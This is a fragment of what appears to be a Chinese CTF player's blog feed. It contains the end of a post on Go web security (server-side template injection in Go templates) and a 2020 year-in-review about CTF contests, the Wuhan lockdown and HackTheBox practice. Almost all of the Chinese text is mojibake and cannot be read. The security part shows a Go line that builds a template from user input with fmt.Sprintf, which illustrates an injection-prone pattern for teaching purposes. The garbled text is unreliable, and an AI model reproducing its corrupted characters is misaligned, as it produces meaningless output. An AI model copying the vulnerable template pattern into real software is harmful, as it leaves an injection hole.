,rubyä¸­ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ã€‚å½“ç„¶ï¼Œå¦‚æœæ˜¯ä»reDOSå¼•ç”³åˆ°æ­£åˆ™ç›²æ³¨çš„è¯ï¼Œsqlæ³¨å…¥ä¸­å€’ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µã€‚æ€»ä¹‹å°±æ˜¯åˆ©ç”¨å·®å¼‚æ€§è¿›è¡Œæ•°æ®æå–ã€‚å¯æƒœå› ä¸ºå¤ªå®¹æ˜“åç¯å¢ƒäº†ï¼Œæ‰€ä»¥å¾ˆéš¾å‡ºé“é¢˜åˆ°æ¯”èµ›ä¸­ :(</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>æœ€åä¸€ä¸ªå°±ç®€å•æä¸€ä¸‹ssti.è¦è¯´golangè¿™ç§é™æ€ç¼–è¯‘è¿˜ä¼šå‡ºsstiè¿˜æ˜¯æŒºéš¾çš„( é™¤éæºç ä¸­ç”¨sprintf æˆ–è€…è¯´æ‹¼æ¥æ¥æ„å»ºtemplateçš„å‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmpl = fmt.Sprintf(<span class="string">`&lt;h2&gt;No search results for %s&lt;/h2&gt;`</span>, xxx)</span><br></pre></td></tr></table></figure><p>golangçš„templateè·Ÿå¾ˆå¤šæ¨¡æ¿å¼•æ“çš„è¯­æ³•å·®ä¸å¤šï¼Œæ¯”å¦‚åŒèŠ±æ‹¬å·æŒ‡å®šå¯è§£æçš„å¯¹è±¡ã€‚<code>.xxx</code>è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡çš„xxxå±æ€§ã€‚<code>.</code>å°±æ˜¯å½“å‰ä½œç”¨åŸŸçš„å½“å‰å¯¹è±¡ï¼ŒåŸºæœ¬å°±è·Ÿhandlebarsé‡Œçš„thiså·®ä¸å¤šã€‚</p><p>å‡å¦‚æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯å¯è§£æçš„,å°±æœ‰å¯èƒ½æ³„éœ²templateåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•å…¥çš„å¯¹è±¡å†…å®¹(æ‰§è¡Œçš„æœ¬è´¨å°±æ˜¯åˆå¹¶æ›¿æ¢)</p><p>ç®€å•çš„demoå¯ä»¥å‚è€ƒè¿™é‡Œ <a href="https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html" target="_blank" rel="noopener">https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html</a></p><p>å¦‚æœä¼ å…¥çš„structå±æ€§å«æœ‰æŒ‡é’ˆçš„è¯(éå¸¸å¸¸è§ï¼Œå› ä¸ºç”¨æŒ‡é’ˆå¯ä»¥èŠ‚çœå¾ˆå¾ˆå¤šç©ºé—´),æˆ‘ä»¬sstiçš„å›æ˜¾å°±åªæ˜¯ä¸€ä¸ªåœ°å€ã€‚éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»è®¿é—®å±æ€§æ‰ä¼šè§£å¼•</p><h2 id="Summary-amp-amp-Reference"><a href="#Summary-amp-amp-Reference" class="headerlink" title="Summary &amp;&amp; Reference"></a>Summary &amp;&amp; Reference</h2><p>ç®€å•çš„æ¢³ç†ä¸‹è‡ªå·±è§è¿‡çš„golangå®‰å…¨é—®é¢˜(CTF-based web go)ã€‚å…¶å®åƒä¹‹å‰dasCTFä¸­ä¹Ÿæœ‰golangçš„é¢˜ç›®ï¼Œç”¨gobåºåˆ—åŒ–å­˜å†…å®¹åˆ°cookieï¼Œä¸è¿‡åˆ©ç”¨ç‚¹ä¸goçš„å…³ç³»ä¸º0ï¼Œæ‰€ä»¥ä¸è°ˆã€‚</p><p>è‡ªå·±golangçš„å¼€å‘è¿˜æœ‰å¾ˆå¤šå€¼å¾—å»å­¦çš„ï¼Œè¿™é—¨è¯­è¨€ç¡®å®æœ‰å…¶ä¼˜è¶Šä¹‹å¤„ä»¥åŠä¸€äº›å¯èƒ½å­˜åœ¨å¹¶è¢«æŒ–æ˜çš„å®‰å…¨é—®é¢˜</p><p><a href="https://github.com/tsg-ut/tsgctf2020" target="_blank" rel="noopener">https://github.com/tsg-ut/tsgctf2020</a><br><a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/" target="_blank" rel="noopener">https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/</a><br><a href="https://github.com/golang/go/issues/30794" target="_blank" rel="noopener">https://github.com/golang/go/issues/30794</a><br><a href="https://github.com/golang/go/issues/40940" target="_blank" rel="noopener">https://github.com/golang/go/issues/40940</a><br><a href="https://github.com/mwarzynski/confidence2019_teaser_lottery" target="_blank" rel="noopener">https://github.com/mwarzynski/confidence2019_teaser_lottery</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Farewell to 2020</title>
      <link href="2020/12/30/Farewell-to-2020/"/>
      <url>2020/12/30/Farewell-to-2020/</url>
      
        <content type="html"><![CDATA[<p>Time to say goodbye</p><a id="more"></a><p>2020é©¬ä¸Šå°±ç»“æŸäº†ã€‚æŒ‰å¾€å¹´çš„æƒ¯ä¾‹ï¼Œæ€»è¦å†™ç¯‡æ–‡ç« å›é¡¾ä¸‹è‡ªå·±ä¸€å¹´çš„ç»å†çš„ã€‚å› æ­¤å°±ç»§ç»­çŸ«æƒ…çš„è®°å½•ä¸‹å§ã€‚</p><p>è¿˜è®°å¾—1æœˆä»½åˆæ—¶ä¸€å †æœŸæœ«è€ƒè¯•æ‰å †ï¼Œå½“æ—¶æœŸæœ«æ€»å…±è€ƒäº†12é—¨ï¼Œäººéƒ½è€ƒå‚»äº†ã€‚æœ€å10å·æ—©ä¸Šé‡å­ç‰©ç†è€ƒå®Œç›´æ¥å†²å›å¯å®¤è·Ÿå®¤å‹ç©é¥¥è’æ”¾æ¾2333ã€‚ç„¶åç¬¬äºŒå¤©å°±å¼€å§‹åšylgç¾¤é‡Œå‘çš„code-breaking é¢˜ç›®è¿˜æœ‰ä¸€äº›ctfé¢˜ã€‚è€å®è¯´ï¼Œå½“æ—¶è¿˜å•¥éƒ½ä¸ä¼šï¼ŒåŸºæœ¬è‡ªå·±åšä¹Ÿä¸€è„¸æ‡µé€¼ã€‚ä¸è¿‡åæ­£ä»¥å‡†å¤‡æ•°æ¨¡ç¾èµ›ä¸ºç†ç”±ç•™åœ¨å­¦æ ¡äº†ï¼ˆç»“æœæ•°æ¨¡çŸ¥è¯†å•¥ä¹Ÿæ²¡å­¦XPï¼‰ï¼Œç„¶åå°±å¯ä»¥èŠ±å¾ˆé•¿æ—¶é—´çœ‹wp,å¤ç°ã€‚è¯´å®è¯æ”¶è·è¿˜æŒºå¤§çš„ã€‚</p><p>å½“æ—¶å®šäº†ä¸ªå°ç›®æ ‡ï¼Œå›æ­¦æ±‰å‰æ¯å¤©éƒ½æœ‰äº§å‡ºï¼Œè¿˜æ˜¯æŒºéš¾å¾—åšåˆ°äº†ã€‚<br><img src="https://hackmd.summershrimp.com/uploads/upload_905e7a34a95931ff77952e7df45d94ee.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_905e7a34a95931ff77952e7df45d94ee.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>1.16å›æ­¦æ±‰äº†ï¼Œå¥½åƒå›å»ç¬¬ä¸€å¤©å°±æŠŠç”µè„‘æ³¼äº†æ°´å¯¼è‡´ç”¨ä¸äº†äº†ã€‚ã€‚ã€‚ç„¶åè·Ÿè€çˆ¸å»ä¿®ç”µè„‘é¡ºä¾¿åƒäº†å›çƒ§çƒ¤ã€‚åé¢çš„äº‹å°±ä¸ç”¨è¯´äº†ï¼Œç–«æƒ…çªç„¶çˆ†å‘ï¼Œæ­¦æ±‰è¿˜ååæ˜¯æ ¸å¿ƒåœ°åŒºï¼Œç›´æ¥å°åŸã€‚æˆ‘ä»¬ä¹Ÿåªèƒ½å‘†åœ¨å®¶é‡Œåšå¥½è‡ªæˆ‘é˜²æŠ¤ã€‚</p><p>  å®è¯è¯´ï¼Œé‚£æ®µæ—¶é—´çš„ç¡®æœ‰äº›äººå¿ƒæƒ¶æƒ¶ã€‚èº«è¾¹äººåæ˜ å‡ºçš„åŒ»é™¢ä¹±è±¡è¿œæ¯”æŠ¥é“çš„æƒŠäººï¼Œå†è€…ï¼Œæ–°å† å¨åŠ›ç¡®å®æƒŠäººï¼Œæ¯å¤©çœ‹åˆ°é‚£äº›æ•°å­—çš„å¢åŠ ï¼Œå¿ƒé‡ŒçœŸçš„ä¸æ˜¯æ»‹å‘³ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½é»˜é»˜ç¥ˆç¥·ç–«æƒ…èµ¶å¿«è¿‡å»ã€‚</p><p>  ç„¶è€Œåœ¨å®¶çš„æœ€å¤§å¥½å¤„å°±æ˜¯å¯ä»¥å°½æƒ…æ‰“ctfäº†ã€‚æœ¬æ¥å¤§äºŒä¸Šè¯¾å¤šåˆ°è‡ªå·±æ ¹æœ¬æ²¡æ—¶é—´å»å­¦ä¹ ï¼Œå»è®¤çœŸåšå‡ é“é¢˜ç›®ã€‚ç°åœ¨å®…åœ¨å®¶é‡Œçš„ç¡®å¾ˆé€‚åˆç›¯ç€ç”µè„‘ï¼Œå­¦äº›æ„Ÿå…´è¶£çš„çŸ¥è¯†æˆ–è€…å¤ç°å‡ é“é¢˜ç›®äº†ã€‚æ°å¥½vidar-teamå¸ˆå‚…ä»¬ä¸¾åŠäº†hgameï¼Œäºæ˜¯å°±åˆå®šäº†ä¸ªå°ç›®æ ‡ï¼šå°½é‡ak æ‰æ¯å‘¨çš„web.(ç»“æœåˆ°week3å°±akä¸äº†orz.xssæ²¡åšå‡ºæ¥)</p><p>  ç„¶åå¥½åƒå°±å»æ‰“äº†å‡ å¤©æ•°æ¨¡ï¼Œæ°´äº†ç¯‡ç¾èµ›è®ºæ–‡ã€‚å½“æ—¶è‡ªå·±åŸºæœ¬å°±æŒ‰æ‰˜ç¦ä½œæ–‡çš„ä¸€äº›å¥—è·¯å†™çš„ï¼Œæœ€åå†™å‡ºæ¥æœ‰äº›å†…å®¹ä¸å¿ç›´è§†ã€‚ã€‚ã€‚å»ºæ¨¡ä¹Ÿæ˜¯çå»ºçš„ã€‚æœ€åå±…ç„¶æ··äº†ä¸ªHå¥–ï¼Ÿï¼Ÿäºæ˜¯æœæ–­å¼ƒå‘æ•°æ¨¡ï¼Œå¤ªç„å­¦äº†ã€‚</p><p>  ç„¶åç¬¬ä¸€æ¬¡æ‰“æ¯”è¾ƒå®Œæ•´çš„ctfåº”è¯¥å°±æ˜¯é‚£ä¸ªæ–°æ˜¥æˆ˜å½¹äº†ã€‚<br>  <img src="https://hackmd.summershrimp.com/uploads/upload_304b2190328a70c20ff8aadc1f898956.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_304b2190328a70c20ff8aadc1f898956.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>icqæ–°æ˜¥æˆ˜å½¹åº”è¯¥æ˜¯è‡ªå·±å¤´ä¸€æ¬¡æ„Ÿè§‰è‡ªå·±å¯’å‡çš„ä»˜å‡ºæ²¡ç™½è´¹ã€‚åƒæˆ‘è¿™ç§å¤©èµ‹æ¯”è¾ƒå·®çš„ï¼Œä¸€å¼€å§‹å­¦webåªèƒ½çº¯é åˆ·é¢˜ã€‚æœ€åèƒ½åšå‡ºå¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„</p><p>ç„¶åå°±æ˜¯çªå¦‚å…¶æ¥çš„å…¥é˜Ÿé¢˜ï¼Œä¸€é“åŸå‹é“¾æ±¡æŸ“+rogue mysql ä»»æ„è¯»ã€‚æ±¡æŸ“è›®ç®€å•çš„ï¼Œrogue mysql å½“æ—¶æ²¡æ¥è§¦è¿‡ä¸€è„¸æ‡µé€¼ï¼Œä¸è¿‡åæ¥ç»™äº†å‚è€ƒèµ„æ–™çœ‹å°±èƒ½åšäº†ã€‚</p><p>3æœˆä»½ï¼Œxctfé«˜æ ¡æˆ˜å½¹ï¼Œè‡ªå·±ç»ˆäºç¬¬ä¸€æ¬¡èƒ½è·Ÿx1cçš„ä¼™ä¼´ä»¬ä¸€èµ·åšé¢˜äº†ã€‚ç„¶è€Œç¬¬ä¸€æ¬¡æ‰“xctfè¿™ç§è§„æ¨¡çš„æ¯”èµ›æ—¶è¿˜æœ‰äº›ä¸é€‚åº”ï¼Œå¥½å‡ é“é¢˜éƒ½æ˜¯åªä¼šåšä¸€éƒ¨åˆ†ï¼Œå´ä¸èƒ½å®Œæ•´çš„åˆ©ç”¨ã€‚å”¯ä¸€ä¸€ä¸ªå‡ ä¹èƒ½å®Œæ•´åšå®Œçš„webé¢˜æœ€åä¸€æ­¥åˆ©ç”¨ä¸äº†ã€‚ã€‚ã€‚æ‰€ä»¥è¯´å½“æ—¶æœ‰ç‚¹å°æŒ«æŠ˜å§ã€‚äºæ˜¯å°±å»buuåˆ·é¢˜äº†</p><p>æ¥ä¸‹æ¥å‡ ä¸ªæœˆå¯ä»¥è¯´åŸºæœ¬å°±æ˜¯å¸¸è§„åŒ–æ“ä½œï¼šä¸Šç½‘è¯¾ï¼Œå†™ä½œä¸šï¼Œåˆ·buuï¼Œæ°´åšå®¢ã€‚ç„¶åè§„æ¨¡ç›¸å¯¹å¤§ç‚¹çš„æ¯”èµ›å°±å»æ‰“ä¸€æ‰“ï¼Œctftimeä¸Šæ‰¾äº›å›½é™…èµ›çš„æœ‰è¶£é¢˜ã€‚ç»ˆäºbuué‚£è¾¹ä¸çŸ¥ä¸è§‰åˆ·åˆ°äº†webæ¦œä¸€ï¼Œxctfä¹ŸåŸºæœ¬èƒ½åš1ï¼Œ2ä¸ªweb.ä¸è¿‡æ¯”è¾ƒçœ‹é‡çš„æ¯”èµ›å°±ç›´æ¥æ— ç¼˜äº†ã€‚ã€‚ã€‚</p><p>6-8æœˆè¿™æ®µæ—¶é—´å°±æ¯”å¤æ‚å§ï¼Œå› ä¸ºå®è¯è¯´æ²¡ä»€ä¹ˆäº§å‡ºã€‚è‡ªå·±åŸºæœ¬å°±æ¯å¤©æ‰¾hacktheboxä¸Šçš„é¶æœºåšã€‚å¼€å§‹æ˜¯åªèƒ½æŒ‰ç…§wp,åšäº›é€€å½¹é¶æœºã€‚åæ¥å°è¯•äº†ä¸‹ç°å½¹çš„é¶æœºï¼Œæ„å¤–å‘ç°è¿˜èƒ½ä¸Šæ‰‹ï¼Ÿäºæ˜¯ä»ç®€å•ï¼Œåˆ°å›°éš¾ï¼Œåˆ°insaneéš¾åº¦éƒ½æœ‰å°è¯•ã€‚æœ‰æ—¶å€™ä¼šå› ä¸ºæ²¡æœ‰æ€è·¯å¡åœ¨ä¸€ä¸ªåœ°æ–¹å¾ˆä¹…å¾ˆä¹…ï¼Œåªèƒ½åœ¨htbè®ºå›ä¸Šæ‰¾å¤–å›½å‹äººæ±‚æŒ‡ç‚¹ã€‚æ¯”è¾ƒæ¬£æ…°çš„æ˜¯ï¼Œå¤§å®¶éƒ½å¾ˆä¹æ„ç»™æˆ‘ä¸€äº›æç¤ºï¼Œå¹¶åœ¨è‡ªå·±åšå‡ºæ¥åé“å£°ç¥è´ºã€‚æ‰€ä»¥è¯´æœ‰é—®é¢˜ä¸€å®šè¦å¤§èƒ†é—®å‘€ï¼ŒåŒæ—¶ä¹Ÿéå¸¸æ„Ÿè°¢é‚£äº›ç»™è¿‡æˆ‘å¸®åŠ©çš„äºº</p><p>ä¸è¿‡è¿™æ®µæ—¶é—´ä¹Ÿæœ‰äº›å°éƒé—·ï¼Œå› ä¸ºå‡ æ¬¡xctf webå‡ ä¹éƒ½æ²¡äººè¾“å‡ºäº†ã€‚å­¦å¼Ÿä»¬å½“æ—¶è¿˜æ²¡å…¥é˜Ÿï¼Œæ¯æ¬¡å„ç§æ¯”èµ›çœ‹webéƒ½åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªï¼Œæ²¡äººå¸®åŠ©ã€‚é‚£æ—¶å€™åæ¬¡ä¹Ÿéƒ½ä¸è¡Œï¼Œæ„Ÿè§‰è‡ªå·±ä¸€ä¸ªäººæ ¹æœ¬æ²¡æ³•carryã€‚cybricsè·Ÿwmctfæ›´æ˜¯æ„Ÿè§‰å°ç»¿è‰éƒ½æ²¡äººæ‰“äº†ï¼ˆåæ¥æ‰çŸ¥é“æ˜¯wmctfæ˜¯å»æ”¯æ´suäº†ï¼‰ã€‚æ€»ä¹‹pushäº†ä¸€ä¸‹å°±å†³å®šwebè¿™è¾¹æå‰è€ƒæ ¸äº†ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œè¿™æ®µæ—¶é—´æ²¡ä»€ä¹ˆäººæ‰“x1cå¯¹æˆ‘æ¥è¯´æœ‰äº›æ¨è¿›çš„ä½œç”¨çš„ï¼Œæˆ‘ä¼šæ›´åŠ é€¼è¿«è‡ªå·±å»å¤šå­¦äº›å†…å®¹ï¼Œä¸ç„¶ç°æœ‰çš„å®åŠ›æ ¹æœ¬ä¸å¤Ÿã€‚</p><p>çœŸæ­£æœ‰æ‰€æ”¹è§‚çš„æ˜¯8æœˆä»½æœ«äº†ã€‚<br>æœ€æ—©å¼€å§‹æ˜¯å¤©ç¿¼æ¯,çº¿ä¸Šé ç¥¥å“¥carryè¿›final,ç„¶åfinalæ„å¤–çš„æ‰“åˆ°äº†äºŒç­‰å¥–ã€‚è®©æˆ‘è§‰å¾—è‡ªå·±æš‘å‡htbåšçš„è¿˜æ˜¯æŒºæœ‰ç”¨çš„hhh.ä¹‹åæ‰“äº†å›½èµ›ï¼Œæ‰“äº†é’“é±¼åŸï¼Œæ‰“äº†å¼ºç½‘æ¯ã€‚æˆ‘çš„åšé¢˜çŠ¶æ€ä¹Ÿä»æ»¡çŠ¶æ€åˆ°å¼€å§‹æ‘¸äº†ï¼ˆå…¶å®æ˜¯å› ä¸ºqwbéš¾åº¦æ¯”è¾ƒé«˜ï¼‰ã€‚</p><p>9æœˆä»½è¿”æ ¡ï¼Œå…ˆæ˜¯è¡¥ä¹‹å‰çš„æœŸæœ«è€ƒã€‚ä¸å¾—ä¸è¯´å› ä¸ºç½‘è¯¾è‡ªå·±çš„æ•ˆç‡ç¡®å®ä¸‹é™äº†ï¼Œè€ƒè¯•ä¸åƒä»¥å‰é‚£æ ·å¾—å¿ƒåº”æ‰‹ã€‚ä¸­é—´ç”µå·¥ç”µå­å› ä¸ºæ’ä¸Šå›½èµ›åˆ†åŒºèµ›è¿˜ç¼“è€ƒäº†ã€‚ï¼ˆä¸è¿‡æœ€åè¿˜æ˜¯95,è¿˜æ˜¯æŒºæ»¡æ„çš„ï¼‰</p><p>å›½èµ›åˆ†åŒºèµ›å°±æŒºæƒŠå¿ƒåŠ¨é­„äº†ã€‚å½“æ—¶æˆ‘ä»¬è¿™è¾¹ä¸¤ä¸ªå­¦å¼Ÿå»é’“é±¼åŸäº†ï¼Œåˆ†åŒºèµ›å°±åŒäººæ‰“ã€‚pwnçˆ·è¿˜å› ä¸ºè€ƒè¯•åªèƒ½æ‰“ç¬¬ä¸€å¤©ä¸Šåˆã€‚ä¸è¿‡å°±ç®—è¿™æ ·ï¼Œç¬¬ä¸€å¤©å¼€åœºä¸€ä¸ªåŠå°æ—¶è‡ªå·±å°±æŠŠå½“æ—¶web akäº†ï¼ˆä¸è¿‡æ¯”ä¸äº†rmbï¼‰ã€‚æ‹¿äº†1ä¸ªå¼±æ™ºä¸€è¡€è·Ÿä¸¤ä¸ª2è¡€ã€‚è¿›å…¥æŠ–è…¿çœ‹æ¦œé˜¶æ®µã€‚ç„¶è€Œæ²¡æœ‰pwnçœŸçš„ä¼¤â€¦â€¦ç¬¬äºŒå¤©æ›´æ˜¯å› ä¸ºåªæœ‰æˆ‘ä¸€ä¸ªäººå•æŒ‘ï¼Œå¿ƒæ€è´¼å·®ã€‚å½“æ—¶ä¸€ä¸ªä¸æ˜¯å¾ˆéš¾çš„pgsqléƒ½æ²¡åšå‡ºæ¥ã€‚æ€»ä¹‹ç¬¬äºŒå¤©æ¯”å®Œåæ€»æ„Ÿè§‰æ€»å†³èµ›æ²¡æˆäº†ï¼Œæ„Ÿè§‰åˆè¦é”™è¿‡å›½å­—å¤´æ¯”èµ›äº†â€¦â€¦ä¸è¿‡æœ€åå±…ç„¶ç¬¬7è¿›äº†ï¼Ÿæ„Ÿè°¢fmyyå…‰é€Ÿåšpwnæ•‘äº†æˆ‘ä»¬</p><p>ç„¶åå°±æ˜¯å›½èµ›çº¿ä¸‹ï¼Œåœ¨æ­¦æ±‰æ¯”+å›½åº†å‡æœŸã€‚æˆ‘ç›´æ¥å¸¦ä¸Šè¡Œæå°±èƒ½å›å®¶ä¼‘å‡233ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬<code>æ¬¢è¿å¦¹å­æ‰“ç”µè¯</code>é¦–æ¬¡â€å‡ºå¾â€ä½“éªŒæå·®ã€‚åªå»äº†ä¸‰ä¸ªäººï¼Œfmyyæ‰“è¿‡ä¸€æ¬¡çº¿ä¸‹ï¼Œå‰©ä¸‹ä¸¤ä¸ªéƒ½æ˜¯ç¬¬ä¸€æ¬¡ã€‚ç¬¬ä¸€å¤©adç›´æ¥è¢«æš´æ‰“ã€‚æˆ‘ç›´åˆ°1ç‚¹é’Ÿæ‰èƒ½è®¿é—®åˆ°åˆ«äººé¶æœºï¼ˆé‚£æ—¶å€™å¹³å°å·²ç»ç‚¸äº†ï¼Œåˆ†éƒ½æ²¡äº†ï¼‰ï¼Œåœ¨æ­¤ä¹‹å‰éƒ½åªèƒ½è¢«åŠ¨ä¿®é¢˜æŒ¨æ‰“,æŠ“æµé‡éƒ½æ²¡æ³•å¤ç°å‡ºå»ã€‚ã€‚ã€‚<br><img src="https://i.imgur.com/BjRZTdv.jpg" class="lazyload" data-srcset="https://i.imgur.com/BjRZTdv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´ylb sbä¸æ˜¯æ²¡æœ‰é“ç†çš„ã€‚æˆ‘ç¬¬ä¸€æ¬¡ä½“éªŒå°±è¿™ä¹ˆå·®çœŸå¾—ä¸€ç”Ÿé»‘</p><p>ç¬¬äºŒå¤©æ”¹è§£é¢˜ä¹Ÿæƒ¨æƒ¨ï¼Œå°±åšäº†ä¸ªwebçš„åŸå‹é“¾æ±¡æŸ“æ¸¸æˆé¢˜ã€‚web3å½“æ—¶å±…ç„¶å¿˜äº†é€ƒé€¸äº†ï¼Œå¯èƒ½äººè¢«ylbè¿·æƒ‘å‚»äº†å§ã€‚æ€»ä¹‹ç¬¬ä¸€æ¬¡å›½èµ›å°±è‰è‰ç»“æŸäº†ã€‚å¹¸å¥½X1cteamä»–ä»¬æ‹¿äº†å›½ä¸€ï¼Œä¸äºã€‚æ™šä¸Šå»æŠ½å¥–æ›´è¿·ï¼Œ%60+çš„ä¸­å¥–ç‡æˆ‘å®Œç¾é”™è¿‡ã€‚çœ‹æ¥å¤©ç”Ÿæ²¡è¿™ä¸ªè¿æ°”</p><p>å†é—®å€™ä¸€éylb<br><img src="https://i.imgur.com/H5m8IKA.jpg" class="lazyload" data-srcset="https://i.imgur.com/H5m8IKA.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç¬¬äºŒæ¬¡çº¿ä¸‹æ˜¯å·…å³°æå®¢ã€‚æ²¡è®°é”™çš„è¯å»å·…å³°æå®¢ä¹‹å‰æ˜¯bytectfçš„çº¿ä¸Šã€‚ç„¶åå°±æ˜¯ctfç”Ÿæ¶¯æ°¸è¿œçš„ç—›â€“<code>easyscrapy</code>ï¼Œåˆ©ç”¨é“¾æ‘¸æ¸…äº†ç»“æœå› ä¸ºèµ¶é£æœºæ²¡èƒ½æ¯”èµ›ä¸­è§£å‡ºã€‚ã€‚ã€‚å¥½åœ¨ä¸å½±å“è¿›çº¿ä¸‹ã€‚</p><p>æ¯”èµ›å‰ä¸€å¤©åœ¨æˆéƒ½è·Ÿé˜Ÿå‹ä»¬æ°ç«é”…ã€‚ä¸­åˆåƒçš„æ—¶å€™ä¸è§‰å¾—å¾ˆè¾£ï¼Œç»“æœèƒƒå‘Šè¯‰æˆ‘ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ XP .<br><img src="https://i.imgur.com/66JokaK.jpg" class="lazyload" data-srcset="https://i.imgur.com/66JokaK.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å½“å¤©æ™šä¸Šç›´æ¥ä¸æ•¢ç¢°è¾£é”…äº†ã€‚è¿˜å¤´ä¸€æ¬¡è§åˆ°æˆéƒ½çš„ä¸‰é²œé”…å±…ç„¶æ˜¯è¾£/ç•ªèŒ„/æ¸…æ±¤ã€‚ä½©æœä½©æœ</p><p>ç¬¬äºŒå¤©æ¯”èµ›å‘ç°huashuiteamåœ¨æˆ‘å¯¹é¢ï¼Œæ‹äº†ä¸‹ylg</p><p><img src="https://i.imgur.com/INQCM0S.jpg" class="lazyload" data-srcset="https://i.imgur.com/INQCM0S.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ€åæ‹¿åˆ°å¥–æ¯è›®å¼€å¿ƒçš„ï¼Œæ¯•ç«ŸçœŸçš„å¥½ä¹…æ²¡äº§å‡ºäº†</p><p>æ™šä¸Šçœ‹äº†çœ¼IFSä¸Šçš„ç†ŠçŒ«~ æ„Ÿè§‰æˆéƒ½è¿™ä¸ªåŸå¸‚è¿˜æ˜¯æŒºä¸é”™çš„ã€‚ä¸è¿‡å‰ææ˜¯èƒ½æ‰¿å—çš„çš„å·®å¼‚ã€‚æ¯•ç«Ÿè¿™é‡Œèµ°å‡ æ­¥å°±èƒ½çœ‹è§ä¸€å®¶åŒæµå…”å¤´<br><img src="https://i.imgur.com/rSzQhmr.jpg" class="lazyload" data-srcset="https://i.imgur.com/rSzQhmr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å·…å³°æå®¢æ¯”å®Œå›æ¥å†³å®šæ¢ç”µè„‘äº†ã€‚ä¹‹å‰çš„ç”µè„‘å¤ªå¡äº†ï¼Œå¯¼è‡´æ¯”èµ›æ—¶è™šæ‹Ÿæœº+2ä¸ªideå°±å¡æˆshiï¼Œæ€å‰æƒ³åæ¢äº†huawei matebook14.ä¸»è¦æ˜¯çœ‹é‡äº†æ€§ä»·æ¯”ï¼Œç„¶åè‡ªå·±åçˆ±è½»è–„æœ¬ï¼ŒåŠ ä¸Šä¸æ‰“æ¸¸æˆï¼Œæ€§èƒ½ç»å¯¹å¤Ÿç”¨äº†ã€‚è‡³äºmacå°±ç­‰ä»¥åè‡ªå·±éœ€è¦ç”Ÿäº§åŠ›æ—¶å†æé’±ä¹°å§ XD</p><p>ç„¶åå¥½åƒæ˜¯XNUCAçš„çº¿ä¸Šæ¥äº†ï¼Œæˆ‘åˆä¸€æ¬¡çˆ†é›¶ã€‚ã€‚ã€‚yysy 